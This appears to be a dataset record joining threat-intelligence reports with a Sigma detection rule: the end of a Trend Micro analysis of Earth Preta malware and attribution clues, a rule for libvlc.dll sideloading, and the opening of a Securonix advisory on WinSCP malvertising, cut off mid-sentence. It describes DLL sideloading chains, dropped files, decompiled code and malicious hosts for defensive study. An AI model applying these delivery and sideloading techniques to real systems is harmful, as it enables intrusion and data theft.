RELATIONS    BEHAVIOR    CONTENT    TELEMETRY    COMMUNITY\n  \n  ITW Urls (2)\n  Scanned    Detections    Status    URL\n  2022-10-13    0 / 89    200    https://doc-00-bk-docs.googleusercontent.com/docs/secure/ha0r937gcu77deffklsulhg5h7mbp1/ebeb0v8kra4s9iis0j1jrfim5urmon3/1665658800000/1191311274156318125/1/YXMF6d9-TLvg-EDn-1nPtm6qklPMEw?=download&uuid=5eb7e5b1-4c93-42c2-bb09-ec34dbd051a8\n  2022-10-13    0 / 89    200    https://drive.google.com/uc?id=1YXMF6d9-TLvg-EDn-1nPtm6qklPMEw&export=download\n  \n  ITW Domains (2)\n  Domain                                    Detections    Created      Registrar\n  doc-00-bk-docs.googleusercontent.com      0 / 87       2008-11-17   MarkMonitor Inc.\n  drive.google.com                           1 / 88       1997-09-15   MarkMonitor Inc.\n  \n  ITW IP Addresses (3)\n  IP                  Detections    Autonomous System    Country\n  142.251.120.113    0 / 88       15169               US\n  142.251.161.132    0 / 88       15169               US\n  209.85.147.101    0 / 88       15169               US\n  \n  Execution Parents (1)\n  Scanned         Detections    Type                       Name\n  2022-10-10      0 / 64       Office Open XML Document     Notic(20221010)(final).docx\n```\n\n*Figure 46. Relations of the archive file*\n\n```image\nAlt: Figure 47. Content of the file Notic(20221010)(final).docx\nDescription: The image displays a screenshot from VirusTotal showing the analysis of a file named 'Notic(20221010)(final).docx'. It includes details such as a community score of 0 (indicating no security vendors flagged the file as malicious), the file size (11.80 KB), and the upload timestamp (2022-10-10 05:18:49 UTC). The preview section of the image reveals text instructing users to click a link to download files, along with a Google Drive link and a note about extracting passwords dated '10-10-2022'.\nTranscription: |\n  For all files, please click the link of the office network disk to download, or copy the link to the webpage to open the download.\n  \n  https://drive.google.com/uc?id=1YXMF6d9-TJLvg-EDn-1nPtm6gklyPMEw&export=download\n  \n  Extracting passwords: 10-10-2022\n```\n\n*Figure 47. Content of the file Notic(20221010)(final).docx*\n\nIt’s interesting to note that the threat actors use date and time strings written in the same format (DD-MM-YYYY) as the extracting passwords in all the cases we’ve collected so far.\n\n---\n\n## Connecting the dots\n\nDuring our investigation, we observed some data points that connect to the same personnel. For example, we found a specific name “TaoZongjie” among the different malware samples we collected. In addition, the GitHub repository named “YanNaingOo0072022,” mentioned in Avast’s December 2022 report, hosted multiple pieces of malware, including TONESHELL. We also observed that the obfuscation methods have similarities among the different malwares.\n\n---\n\n### User “TaoZongjie”\n\nWe found some samples sharing the same special string/name “TaoZongjie,” including the Cobalt Strike malware, a Windows user on a TONESHELL C&C server, and the displayed message in the pop-up dialog box of TONESHELL.\n\nOur investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled. Here, we found that one of the Windows users was called “TaoZongjie.”\n\n```image\nAlt: Figure 48. Windows users in 38[.]54[.]33[.]228\nDescription: The image is a screenshot of a Windows Server 2012 R2 login screen, displaying two user accounts: one labeled 'TaoZongjie' and the other labeled 'Administrator.' The background is a dark blue, consistent with standard Windows login screens, with user icons next to each username. This image is relevant as it illustrates the presence of the user 'TaoZongjie' on a specific Command and Control (C&C) server mentioned in the CTI context.\nTranscription: |\n  (TaoZongjie)      Administrator\n  \n                    Windows Server 2012 R2\n```\n\n*Figure 48. Windows users in 38[.]54[.]33[.]228*\n\nWhile hunting samples related to this campaign, we came across a tweet about Cobalt Strike posted in April 2021. At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.\n\n```image\nAlt: Figure 49. A tweet about Cobalt Strike\nDescription: The image is a screenshot of a tweet discussing Cobalt Strike, detailing its usage in a cyber attack targeting Myanmar. It outlines the DLL side-loading techniques employed, mentioning specific files such as 'Words.exe,' 'AppXUpdate.exe,' and 'CefBrowser.dll.' The tweet includes a hexadecimal code and snippets of code, illustrating the methods used for persistence and payload delivery, along with a reference to an embedded RAR file.\nTranscription: |\n  #CobaltStrike\n  Target: Myanmar\n  \"Submit to Admin Officer for Negative results.rar\"\n  b52faf5a2bb331ab852478fd80addbe6\n  \n  DLL side-loading:\n  Words.exe -> wwlibs.dll -> Drops two embedded resources -> Makes AppXUpdate.exe persistence\n  \n  DLL side-loading:\n  AppXUpdate.exe -> CefBrowser.dll\n```\n\n*Figure 49. A tweet about Cobalt Strike*\n\nThe infection flow is as follows: The archive file is delivered through a Google Drive link, which contains a legitimate EXE file, a malicious DLL file, and a decoy document written in Burmese. Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file. In this sample, the string *By:Taozongjie* is being used as the event name.\n\n```image\nAlt: Figure 50. Infection flow of Cobalt Strike\nDescription: The image illustrates the infection flow related to malware operation involving sideloading of executable files and DLLs. It depicts a sequence where an EXE file sideloads a DLL file (wwlib.dll), leading to drops of another EXE (AppXUpdate.exe) that subsequently connects to a backdoor Command and Control (C&C) server. Each component is labeled, indicating the submission of files for negative results, and the connections between the files and the C&C server are visually represented, providing a clear overview of the malware's operational mechanics.\nTranscription: |\n  Submit to Admin Officer for Negative results.rar\n          |\n          v\n  +--------------------+\n  |                    |\n  |  Submit to Admin   |\n  |  Officer for       |\n  |  Negative results  |\n  |  (MAI & MIPT)      |\n  |  (New).EXE         |\n  |                    |\n  +--------------------+\n          |\n          | Sideloads\n          v\n  +--------------------+\n  |                    |\n  |     wwlib.dll      |\n  |                    |\n  +--------------------+\n          |\n          | Drops\n          v\n  +------------------+\n  |                  |\n  |  AppXUpdate.exe  |\n  |                  |\n  +------------------+\n          | Sideloads\n          v\n  +---------------------+\n  |                     |\n  |    CefBrower.dll    |\n  |                     |\n  +---------------------+\n          |\n          | Connects\n          v\n  +-------------------+\n  |                   |\n  |   Backdoor C&C    |\n  |                   |\n  +-------------------+\n  \n  Submit to Admin Officer for Negative results (MAI & MIPT) (Old).docx\n```\n\n*Figure 50. Infection flow of Cobalt Strike*\n\n```image\nAlt: Figure 51. Special string in the sample\nDescription: The image displays a code snippet in a programming language (likely C or C++) that appears to be part of a malware or exploit. The code includes a function that creates an event with the name 'By:Taozongjie', sets error modes, and contains several variables related to time and random values. This code is associated with the threat actor's tactics as discussed in the context of the CTI report, particularly in relation to the use of the string 'TaoZongjie' in various malware samples.\nTranscription: |\n  c\n  void __usercall sub_100014C2(_BYTE *a1@<eax>)\n  {\n      _BYTE *v1; // esi\n      unsigned int v2; // eax\n      CHAR *v3; // edi\n      int v4; // eax\n      signed int v5; // [esp+Ch] [ebp-4h]\n  \n      v1 = ai;\n      v2 = time64(0);\n      srand(v2);\n      v3 = (CHAR *)(MultiByteStr - v1);\n      v5 = 32;\n      do {\n          CreateEventA(0, 1, 0, \"By:Taozongjie\");\n          SetErrorMode(0u);\n          SetConsoleMode(0, 4u);\n          v4 = rand();\n          v1[(_DWORD *)v1] = *(_BYTE *)sub_10001480(v4 % 126 + 1); // xor 7D\n          SetConsoleTitleA(\"*8618087758761\");\n          SetLastError(0xEu);\n          ++v1;\n          ++v5;\n      } while (v5);\n  }\n```\n\n*Figure 51. Special string in the sample*\n\nIn one TONEINS sample (SHA256: *7436f75911561434153d899100916d3888500b1737ca6036e41e0f65a8a68707*), we also observed the string *taozongjie*, which was being used for an event name.\n\n```image\nAlt: Figure 52. Create event taozongjie in TONEINS\nDescription: The image is a code snippet from a disassembler, showing assembly language instructions. It highlights the process of creating an event in a Windows environment, specifically using the CreateEventA function. The string \"taozongjie\" is highlighted, indicating its use as part of the event creation process. Other highlighted sections show the manipulation of registers and memory addresses.\nTranscription: |\n  .text:100057DF loc_100057DF:\n  .text:100057DF mov     ecx, [ebp+var_13DC]\n  .text:100057DF mov     word ptr [ecx+32h], 0\n  .text:100057DF mov     [ebp+var_10], 1\n  .text:100057DF lea     eax, aCreateeventa ; \"CreateEventA\"\n  .text:100057DF call    sub_1000C870\n  .text:1000580A lea     eax, aTaozongjie ; \"taozongjie\"\n  .text:1000580B mov     [ebp+var_600], eax\n  .text:1000580C mov     [ebp+var_F0], eax\n  .text:10005810 mov     [ebp+var_604], eax\n  .text:10005812 mov     [ebp+var_604], eax\n```\n\n*Figure 52. Create event taozongjie in TONEINS*\n\nIn another TONESHELL sample (SHA256: *d950d7d9402dcf014d6e77d30ddd81f994b70f7b0c6931ff1e705abe122a481a*), there are some insignificant export functions, which will appear via message boxes, with the strings *Tao* or *zhang!*. Even though the names of these two strings are not spelled exactly the same way as *taozongjie*, their spellings are still similar.\n\n```image\nAlt: Figure 53. Message boxes of TONESHELL\nDescription: The image displays two pop-up dialog boxes. The left box shows the text '18669098103' with an 'OK' button, and the right box contains '17096581962' along with another 'OK' button. These message boxes are part of the TONESHELL malware analysis, demonstrating the export functions that appear with the strings 'Tao!' and 'zhang!', which are similar to the string 'taozongjie' mentioned in the context of the ongoing malware investigation.\nTranscription: |\n  18669098103\n  Tao!\n  [OK]\n  \n  17096581962\n  zhang!\n  [OK]\n```\n\n*Figure 53. Message boxes of TONESHELL*\n\nBased on what we found among the different samples, we assume that *taozongjie* could be one of the flags used by the threat actors.\n\n---\n\n### GitHub user “YanNaingOo0072022”\n\nThe GitHub user “YanNaingOo0072022” was mentioned in both an Avast and an ESET report. The user’s repositories host various malware, including the latest versions of TONEINS, TONESHELL, and a new tool, QMAGENT, which ESET named MQsTTang. At the time of writing, this GitHub space was still accessible, with five repositories: “View2015,” “View2016,” “1226,” “ee,” and “14.” Among these, “View2015” and “View2016” were empty.\n\n```image\nAlt: Figure 54. The YanNaingOo0072022 GitHub space\nDescription: The image displays the GitHub profile of the user \"YanNaingOo0072022.\" It features a circular profile icon, a follow button, and a list of popular repositories. The repositories include \"View2015,\" \"View2016,\" \"1226,\" \"ee,\" and \"14,\" all marked as public. The layout is typical of a GitHub overview page, showcasing the user's repository activity and visibility.\nTranscription: |\n  YanNaingOo0072022\n  \n  Popular repositories\n  - View2015  Public\n  - 1226  Public\n  - 14  Public\n  - View2016  Public\n  - ee  Public\n  \n  Follow\n```\n\n*Figure 54. The YanNaingOo0072022 GitHub space*\n\n---\n\n#### 1226\n\nThe archive files in this repository are all the same but have different file names. We believe that these files were meant for different victims.\n\n```image\nAlt: Figure 55. The 1226 repository\nDescription: The image is a screenshot of a GitHub repository named 'YanNaingOo0072022' with the identifier '1226'. It displays a list of files in the repository, including compressed files with extensions such as '.7z' and '.rar'. The repository also contains folders labeled 'New folder' and files titled 'Presentation of PN POM 2023-202'. The interface includes options for code, issues, pull requests, and other repository management features, indicating it is part of a public GitHub project.\nTranscription: |\n  YanNaingOo0072022 / 1226  Public\n  \n  Code  Issues  Pull requests  Actions  Projects  Security  Insights\n  \n  main  1 branch  0 tags\n  \n  YanNaingOo0072022 Add files via upload\n  - Desktop.7z\n  - Desktop.rar\n  - New folder.7z\n  - New folder.rar\n  - Presentation of PN POM 2023-202...\n  - Presentation of PN POM 2023-202...\n  \n  95ff345  3 weeks ago  1 commit\n```\n\n*Figure 55. The 1226 repository*\n\nUpon unarchiving the compressed file, we found two files with the fake extension “.doc” containing one-byte XOR encrypted sections. Both share the same file structure (a PE payload hidden in a DOCX file) as the one we referred to in the arrival vectors section. These files ended up being the TONEINS and TONESHELL malware.\n\n```image\nAlt: Figure 56. The files inside the archive\nDescription: The image displays a file directory structure on a Windows-like operating system. It shows a folder titled 'Presentation of PN POM 2023-2028 to DND(Final)' containing several files. Among them are two files named 'Presentation of PN POM 2023-2028 to DND(Final).exe' and 'Presentation of PN POM 2023-2028 to DND.doc', as well as another document 'Presentation of PN POM to FOIC.doc' and a file named 'libcef.dll'. The files vary in size and type, indicating a mix of executable and document formats, which aligns with the context of malware distribution by disguising malicious files as legitimate documents.\nTranscription: |\n  Folder: Presentation of PN POM 2023-2028 to DND(Final)\n  \n  | Name                                               | Date modified       | Type                                     | Size   |\n  | -------------------------------------------------- | ------------------- | ---------------------------------------- | ------ |\n  | Presentation of PN POM 2023-2028 to DND(Final).exe | 3/28/2022 11:34 AM  | Application                              | 398 KB |\n  | Presentation of PN POM 2023-2028 to DND.doc        | 12/6/2022 11:43 AM  | Microsoft Office Word 97 - 2003 Document | 239 KB |\n  | Presentation of PN POM to FOIC.doc                 | 12/26/2022 11:44 AM | Microsoft Office Word 97 - 2003 Document | 513 KB |\n  | libcef.dll                                         | 12/26/2022 11:45 AM | Application extension                    | 715 KB |\n```\n\n*Figure 56. The files inside the archive*\n\n---\n\n#### 14\n\nThe file *Documents members of delegation diplomatic from Germany.Exe*, found in the *Documents.rar* archive, is a novel malware that communicates over the MQTT protocol. In March 2023, ESET published a detailed technical report on this backdoor, which it named “MQsTTang.”\n\nBeginning in January, we discovered that MQsTTang was being used as the new arrival vector in some of the incidents we encountered, specifically in campaigns targeting individuals involved with government entities. This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices. Malicious actors using this technique can effectively hide the real C&C server behind the protocol.\n\n```image\nAlt: Figure 57. The 14 repository\nDescription: The image depicts a screenshot of a GitHub repository titled 'YanNaingOo0072022', specifically focusing on its main page. It shows a single branch labeled 'main' with no tags or issues reported. The repository contains one file, 'Documents.rar', which was uploaded two weeks prior. The interface includes options for 'Code', 'Issues', 'Pull requests', 'Actions', 'Projects', 'Security', and 'Insights', indicating the functionalities available on GitHub for managing code and projects.\nTranscription: |\n  YanNaingOo0072022 / 14  Public\n  \n  Code  Issues  Pull requests  Actions  Projects  Security  Insights\n  \n  main  1 branch  0 tags\n  \n  YanNaingOo0072022  Add files via upload\n  Documents.rar  Add files via upload\n  \n  ac9be7a  2 weeks ago  1 commit\n  2 weeks ago\n```\n\n*Figure 57. The 14 repository*\n\n---\n\n#### ee\n\nThe file *CVs Amb Office PASSPORT Ministry Of Foreign Affairs.exe*, which is the malware QMAGENT, can be found in the *CVs Amb.rar* archive.\n\n```image\nAlt: Figure 58. The ee repository\nDescription: The image is a screenshot of a GitHub repository belonging to the user \"YanNaingOo0072022\". It shows the repository's main page, indicating that it is public with one branch and no tags. There is a file named \"CVs Amb.rar\" uploaded to the repository, which was added three weeks ago. The commit history shows one commit related to the file upload. This screenshot is relevant to the context of cyber threat intelligence, specifically regarding the malware QMAGENT.\nTranscription: |\n  YanNaingOo0072022 / ee  Public\n  \n  Code  Issues  Pull requests  Actions  Projects  Security  Insights\n  \n  main  1 branch  0 tags\n  \n  YanNaingOo0072022  Add files via upload\n  CVs Amb.r  Add files via upload\n  \n  a7b31d7  3 weeks ago  1 commit\n  3 weeks ago\n```\n\n*Figure 58. The ee repository*\n\n---\n\n## Conclusion\n\nOver the past year, security researchers have been discovering and analyzing Earth Preta’s campaigns and toolsets. We were able to attribute some of these to Earth Preta based on similarities among the TTPs, the malware being used, and the timeline of the campaigns. Starting October 2022, the threat actors changed the arrival vector of the TONEINS, TONESHELL, and PUBLOAD malware. Instead of attaching malicious archives or Google Drive links to an email, they now embed the download link in another decoy document and add a password to the archive.\n\nBased on our observations, Earth Preta tends to hide malicious payloads in fake files, disguising them as legitimate ones — a technique that has been proven effective for avoiding detection. As for privilege escalation, the threat actors tend to reuse codes copied from open-source repositories. Meanwhile, they developed customized toolsets designed to collect confidential documents in the exfiltration stage.\n\nOverall, we believe that Earth Preta is a capable and organized threat actor that is continuously honing its TTPs, strengthening its development capabilities, and building a versatile arsenal of tools and malware.\n\nTo help prevent potential threats such as the one posed by advanced persistent threat (APT) groups, we suggest that organizations conduct phishing awareness training for their employees and partners to stress the importance of caution when opening emails, particularly those messages from unfamiliar senders or with unknown subjects.\n\nTo assist organizations in protecting themselves against sophisticated threats, we recommend adopting a comprehensive security strategy that employs advanced technologies capable of identifying and halting such threats across multiple channels, including endpoints, servers, networks, and email communications.\n\n---\n\n## Indicators of Compromise (IOCs)\n\nThe full list of IOCs can be found here.\n\n---\n\n## MITRE ATT&CK\n\n| **Tactic**           | **ID**    | **Name**                                                              |\n| -------------------- | --------- | --------------------------------------------------------------------- |\n| Resource Development | T1583.004 | Acquire Infrastructure: Server                                        |\n|                      | T1587.001 | Develop Capabilities: Malware                                         |\n|                      | T1585.002 | Establish Accounts: Email Accounts                                    |\n|                      | T1588.002 | Obtain Capabilities: Tool                                             |\n|                      | T1608.001 | Stage Capabilities: Upload Malware                                    |\n| Initial Access       | T1566.002 | Phishing: Spearphishing Link                                          |\n| Execution            | T1204.001 | User Execution: Malicious Link                                        |\n|                      | T1204.002 | User Execution: Malicious File                                        |\n| Persistence          | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |\n|                      | T1574.002 | Hijack Execution Flow: DLL Side-Loading                               |\n|                      | T1053.005 | Scheduled Task/Job: Scheduled Task                                    |\n| Privilege Escalation | T1068     | Exploitation for Privilege Escalation                                 |\n|                      | T1134     | Access Token Manipulation                                             |\n| Defense Evasion      | T1140     | Deobfuscate/Decode Files or Information                               |\n|                      | T1036.005 | Masquerading: Match Legitimate Name or Location                       |\n| Lateral Movement     | T1091     | Replication Through Removable Media                                   |\n| Command and Control  | T1071.001 | Application Layer Protocol: Web Protocols                             |\n|                      | T1573.001 | Encrypted Channel: Symmetric Cryptography                             |\n|                      | T1104     | Multi-Stage Channels                                                  |\n|                      | T1095     | Non-Application Layer Protocol                                        |\n| Exfiltration         | T1048     | Exfiltration Over Alternative Protocol                                |\n\n---\n\n**Tags:** \nAPT & Targeted Attacks | Articles, News, Reports | Research",
    "sigma_rule": {
      "title": "Potential Libvlc.DLL Sideloading",
      "id": "bf9808c4-d24f-44a2-8398-b65227d406b6",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"libvlc.dll\", a DLL that is legitimately used by \"VLC.exe\"",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html",
        "https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html"
      ],
      "author": "X__Junior",
      "date": "2023-04-17",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\libvlc.dll"
        },
        "filter_main_vlc": {
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\VideoLAN\\VLC\\",
            "C:\\Program Files\\VideoLAN\\VLC\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "False positives are expected if VLC is installed in non-default locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_libvlc.yml",
    "id": "32"
  },
  {
    "url": "https://www.securonix.com/blog/seolurker-attack-campaign-uses-seo-poisoning-fake-google-ads-to-install-malware/",
    "markdown": "# Securonix Threat Labs Security Advisory: New SEO#LURKER Attack Campaign: Threat Actors Use SEO Poisoning and Fake Google Ads to Lure Victims Into Installing Malware\n\n### tldr:\n\nAn interesting ongoing SEO poisoning/malvertising campaign leveraging WinSCP lures along with a stealthy infection chain lures victims into installing malware (alongside the legitimate WinSCP software). Attackers are likely leveraging dynamic search ads which let threat actors inject their own malicious code while mimicking legitimate sources like Google search pages.\n\nA rather steep uptick in malicious advertising (malvertising) has been observed, especially in the last year which involves threat actors paying either your favorite search engine or social networking sites for ad space in order to promote malware in prominent locations.\n\nThe Securonix Threat Research team has been tracking an ongoing campaign SEO#LURKER which targets “WinSCP” keywords in Google Search results. WinSCP is a popular SSH/SCP connection platform which has established a huge user base over the years making it a lucrative target for threat actors. It’s highly likely that WinSCP is not the only downloadable software being targeted by these threat actors to serve malicious advertisements.\n\nGiven its popularity, WinSCP has been a target in the past, along with a host of other popular software downloads. In July this year, we observed some of these infections resulting in the victim machine being infected with ransomware using similar approaches.\n\nToday, malvertising and SEO poisoning continues to remain popular. As seen in the figure below, the homepage for the popular software tracks about 430K searches in the past three months, and another 50k for the download page itself. Another factor to consider is that this method is also especially lucrative as according to the data below, the CPC (cost per click) ranges between $2.25 and $1.84 USD.\n\n```image\nAlt: Google traffic for winscp.net (three months)\nDescription: The image displays a website analysis interface showcasing keyword search traffic data for the domain 'winscp.net'. It highlights key metrics related to search terms, including 'winscp' with 431.3K searches and 'winscp download' with 50.1K searches over a three-month period. The interface includes sections labeled 'Overview', 'Keywords', and displays total search traffic, organic and paid keywords, as well as cost per click (CPC) values. This data is relevant to understanding the impact of SEO poisoning and malvertising campaigns associated with the popular WinSCP software.\nTranscription: |\n  Website Analysis\n  Overview\n  Traffic\n  Audience\n  Search\n  Paid Search\n  \n  Keywords\n  Watch a Tutorial | Read a guide\n  Total Search Traffic: 1,118,064\n  Total Keywords: 13,555\n  \n  Search traffic - 480k for 3 months\n  \n  | Search Terms       | Change | KD    | Intent | Volume  | CPC   |\n  | ------------------ | ------ | ----- | ------ | ------- | ----- |\n  | winscp             | 431.3k | 57%   | NAV    | 268,520 | $2.25 |\n  | winscp download    | 50.1k  | 16.5% | NAV    | 10,000  | $1.84 |\n  | win scp            |        | 13.9% | NAV    | 3,000   | $2.71 |\n  | ftp client         |        | 34.9% | NAV    | 35,310  | $2.71 |\n  | winscp alternative |        | 0.0%  | NAV    | 1,000   | $2.71 |\n```\n\n### Attack chain overview\n\n```image\nAlt: SEO#LURKER attack chain example\nDescription: The image illustrates the attack chain of the SEO#LURKER campaign, depicting the process through which threat actors lure victims into downloading malware via malicious Google advertisements. The diagram shows the flow of actions starting from a user clicking a download link, leading to various executable files (EXE) and dynamic link libraries (DLL) being dropped and executed. It includes specific components like 'WinSCP' and various URLs, while outlining interactions between these elements, including connections to a command and control server (C2) and persistence mechanisms.\nTranscription: |\n  +-------------------------------------+\n  |         Malicious Google            |\n  |           Advertisement             |\n  |                                     |\n  |          WinSCP                     |\n  |      Download WinSCP                |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |         User clicks \"Download\"      |\n  |                                     |\n  |         https://wincp.net           |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |          ZIP File                   |\n  |                                     |\n  | https://pr.uae.com/WinSCP_v6.1.zip  |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |          Python Script              |\n  |                                     |\n  |            slvpy                    |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |          Drops & Executes           |\n  |                                     |\n  |          C2: niuab.com              |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------+   +-------------------+\n  |      EXE          |   |      DLL          |\n  |                   |   |                   |\n  |   update.exe      |   |   msid.dll        |\n  |                   |   |                   |\n  +-------------------+   +-------------------+\n                  |                |\n                  v                v\n  +-------------------+   +-------------------+\n  |      EXE          |   |      DLL          |\n  |                   |   |                   |\n  |   spools.exe      |   |   foo.dll         |\n  |                   |   |                   |\n  +-------------------+   +-------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |          Persistence                |\n  |                                     |\n  |   using schtasks.exe                |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |          C2: niuab.com              |\n  |                                     |\n  +-------------------------------------+\n                  |\n                  v\n  +-------------------------------------+\n  |          Download/Install           |\n  |                                     |\n  |          WinSCP                     |\n  |                                     |\n  +-------------------------------------+\n```\n\n### Malvertising infrastructure analysis\n\nThe attack begins with the user searching for “WinSCP” in Google. The ad appears before the legitimate website for WinSCP which is https://winscp.net. The malicious advertisement directs the user to a compromised WordPress website gameeweb[.]com which redirects the user to an attacker-controlled phishing site. The threat actors registered a similar domain and an almost identical looking website to trick users into downloading their malware.\n\n#### Malicious DSA ads in Google Search\n\nIt’s also highly likely that the attackers leverage dynamic search ads (DSA). This type of advertising allows threat actors to inject their own malicious code into another, say if the site becomes compromised, or create their own based on the content of their own phishing website. These kinds of ads will promote their own malicious software as if they were the legitimate source from Google search pages.\n\nThis type of advertising has been used extensively in the past by threat actors and will likely continue despite Google’s efforts to mitigate it.\n\n#### Malvertising infrastructure of the SEO#LURKER campaign\n\nThe threat actors registered a domain similar to the legitimate winscp.net in order to appear as legitimate as possible. As you can see in the figure below phishing domain hxxps://winccp[.]net (left) and the legitimate website are nearly identical:\n\n```image\nAlt: lure website versus legitimate winscp website download page\nDescription: The image compares two web pages side by side. On the left, the fake website (labeled 'Fake: winccp.net') mimics the legitimate WinSCP download page, while on the right, the actual legitimate website (labeled 'Real: winscp.net') displays the same download page. Both pages feature a similar layout and content, including the 'WinSCP 6.1 Download' title, advertisements, and a list of new features. The visual similarity is highlighted to demonstrate how the threat actors use a nearly identical design to deceive users.\nTranscription: |\n  Fake: winccp.net\n  Real: winscp.net\n  \n  WinSCP 6.1 Download\n  --------------------\n  Advertisement\n  \n  WinSCP 6.1 is a major application update. New features and enhancements include:\n  - Local file manager mode (two local panels).\n  - Windows 11 flat style graphics.\n  - SSH core upgraded to PuTTY 7.8. That includes support for OpenSSH certificates.\n  - Ongoing delete operation can be moved to background queue.\n  - Showing directory size in file panel.\n  - List of all changes.\n  \n  DOWNLOAD WINSCP 6.1.2 (1.81 MB)\n```\n\nWhen the user clicks the malicious advertisement, they are brought to the domain gaweeweb[.]com which immediately redirects to hxxps://winccp[.]net. The fake WinSCP phishing site follows a similar naming to previous documented campaigns which used the domain winsccp[.]net rather than what we are observing currently.\n\nWhen the “DOWNLOAD WINSCP 6.1.2” link is clicked, the file is downloaded from a seemingly legitimate Japanese website to download the malicious zip package stored at the root of the website: hxxps://pr-uae[.]com/WinSCP_v.6.1.zip.\n\nTraffic from the gaweeweb[.]com website to the fake winsccp[.]net website relies on a correct referrer header being set properly. If the referrer is incorrect, the user is “Rick Rolled” and is sent to the infamous Rick Astley YouTube video.\n\n### Zip file content analysis: WinSCP_v.6.1.zip\n\nAs the victim user would suspect, the zip file is downloaded and once opened, the user is presented with a simple setup.exe file, along (along with a bunch of hidden files). It should be noted that the legitimate WinSCP file download does not download a zip package, rather a single installer.\n\n```image\nAlt: WinSCP_v.6.1.zip file contents (hidden files in red)\nDescription: The image displays the contents of a zip file named 'WinSCP_v.6.1.zip' in a file explorer window. Specific files are highlighted in red, indicating key components of the zip file. These include 'setup.exe,' which is a renamed legitimate file, and 'python311.dll,' which is noted as a 'sideloaded DLL' indicating potential malicious intent. The file sizes and types are also listed, providing detailed information about the contents. The background features a green ASCII art text that reads 'SECURONIX RESEARCH,' emphasizing the context of the image as part of a security advisory.\nTranscription: |\n  This PC > WinSCP_v.6.1.zip\n  \n  Name               Type                     Compressed size  Password  Size       Ratio  Date modified\n  -----------------------------------------------------------------------------------------------------------\n  Extensions         File folder              -                -         -          -      10/19/2023 4:21 AM\n  LICENCE            File                     1 KB             No        2 KB       41%    10/19/2023 4:21 AM\n  license.txt        TXT File                 13 KB            No        37 KB      67%    10/19/2023 4:21 AM\n  python311.dll      Application extension    39,920 KB        No        42,250 KB  6%     10/19/2023 4:21 AM\n  python311x.dll     Application extension    2,178 KB         No        5,626 KB   62%    10/19/2023 4:21 AM\n  setup.exe          Application              51 KB            No        100 KB     50%    10/19/2023 4:21 AM\n  WinSCPlog.chm      Compiled HTML Help file  326 KB           No        347 KB     7%     10/19/2023 4:21 AM\n  WinSCPnet.dll      Application extension    69 KB            No        167 KB     60%    10/19/2023 4:21 AM\n```\n\nInside the zip file there are several files, several of which serve no real purpose. Setup.exe is a renamed legitimate “pythonw.exe” which is digitally signed. The executable is designed to launch GUI or no-UI-at-all scripts so it will never open a popup window. The second file worth mentioning is python311.dll. This is not the legitimate DLL used by Python processes, rather it is built by the attacker which when executed kicks off the malicious code execution.\n\nWhen the user runs setup.exe, the hidden python311.dll is sideloaded and its code contents are executed by the setup/python process. No actual python code is executed at this point. Eventually the pythonw.exe process will crash but not before running the malicious code from the DLL.\n\n### Code execution: “python311.dll”\n\nWhen setup.exe is executed and python311.dll is sideloaded, the process will perform several key functions. First, it downloads and executes a legitimate WinSCP installer. The file is saved to the user’s downloads folder and executed thus kicking off the WinSCP installation. This reinforces legitimacy along with the user’s initial intent of downloading and installing WinSCP.\n\nAfter the installer executes, the malware will create a bunch of files in the user’s %LOCALAPPDATA% directory. The DLL acts as a dropper and loads the following files onto the user’s file system:\n\n- %LOCALAPPDATA%\\Notepad\\dllhost.exe\n- %LOCALAPPDATA%\\Notepad\\libcrypto-1_1.dll\n- %LOCALAPPDATA%\\Notepad\\libffi-7.dll\n- %LOCALAPPDATA%\\Notepad\\libssl-1_1.dll\n- %LOCALAPPDATA%\\Notepad\\python.exe\n- %LOCALAPPDATA%\\Notepad\\python3.dll\n- %LOCALAPPDATA%\\Notepad\\python310.dll\n- %LOCALAPPDATA%\\Notepad\\pythonw.exe\n- %LOCALAPPDATA%\\Notepad\\spoolsv.exe\n- %LOCALAPPDATA%\\Notepad\\slv.py\n- %LOCALAPPDATA%\\Notepad\\sqlite3.dll\n- %LOCALAPPDATA%\\Notepad\\vcruntime140.dll\n- %LOCALAPPDATA%\\Notepad\\vcruntime140_1.dll\n- %LOCALAPPDATA%\\Programs\\Microsoft\\Office\\msi.dll\n- %LOCALAPPDATA%\\Programs\\Microsoft\\Office\\update.exe\n- %LOCALAPPDATA%\\Programs\\Microsoft\\TrustedInstaller\\msi.dll\n- %LOCALAPPDATA%\\Programs\\Microsoft\\TrustedInstaller\\update.exe\n\nThe files created in the “Notepad” directory are all legitimate Python files and library components for running Python scripts. Setup.exe lastly runs the following command which executes the Python code contained in the “slv.py” file.\n\n- `C:\\Users\\[redacted_username]\\AppData\\Local\\Notepad\\pythonw.exe`\n- `C:\\Users\\flareon\\AppData\\Local\\Notepad\\slv.py`\n\nAt this point the user is probably in the middle of installing WinSCP, unaware of the malware currently executing in the background on their system.\n\n### Code execution: slv.py\n\nNow we’re actually executing malicious Python code. The Python file is heavily obfuscated and all but one 